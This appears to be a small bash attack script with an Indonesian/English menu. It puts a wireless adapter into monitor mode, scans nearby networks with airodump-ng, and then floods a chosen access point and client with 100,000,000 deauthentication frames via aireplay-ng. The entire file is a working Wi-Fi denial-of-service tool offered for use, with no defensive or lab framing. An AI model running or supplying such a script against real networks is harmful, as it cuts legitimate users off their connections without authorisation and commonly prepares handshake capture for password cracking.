#!/bin/bash

function mmode(){
  read adapter
  ifconfig $adapter down
  airmon-ng check kill
  iwconfig $adapter mode monitor
  ifconfig $adapter up
  clear
  iwconfig
}
function deauth(){
  airodump-ng --band abg wlan0
  echo "Bssid :"; read bssid
  echo "Channel :"; read ch
  airodump-ng --bssid $bssid --channel $ch wlan0
  echo "Bssid :"; read bssid
  echo "Station :"; read station 
  aireplay-ng --deauth 100000000 -a $bssid -c $station wlan0
}

echo "[1] Bahasa Indonesia";
echo "[2] Inggris";
echo "pilih bahasa :"; read bahasa

case $bahasa in
	1 )
		echo "aktifkan monitor mode[y], monitor mode sudah aktif[N]"
		read mmode
		
		case $mmode in
			y )
				clear
				read -p "Mengaktifkan Monitor Mode, pastikan wireless adapter telah terpasang.\n[Enter] untuk lanjut.."
				iwconfig
				echo "masukan nama adapter :"
				mmode
				clear
				iwconfig
				deauth
				;;
			N )
				clear
				iwconfig
				;;
			* )
				clear
				echo "tidak valid"
				;;
		esac				
		;;
	2 )
		echo "activate monitor mode[y], monitor mode is active[N]"
		read mmode
		
		case $mmode in
			y )
				clear
				read -p "Activating Monitor Mode, make sure the wireless adapter is installed.\n[Enter] to continue ..."
				iwconfig
				echo "Enter the adapter name :"
				mmode
				clear
				iwconfig
				deauth
				;;
			N )
				clear
				iwconfig
				;;
			* )
				clear
				echo "invalid"
				;;
		esac
		;;
	* )
		echo "pilihan tidak ada"
		;;
esac
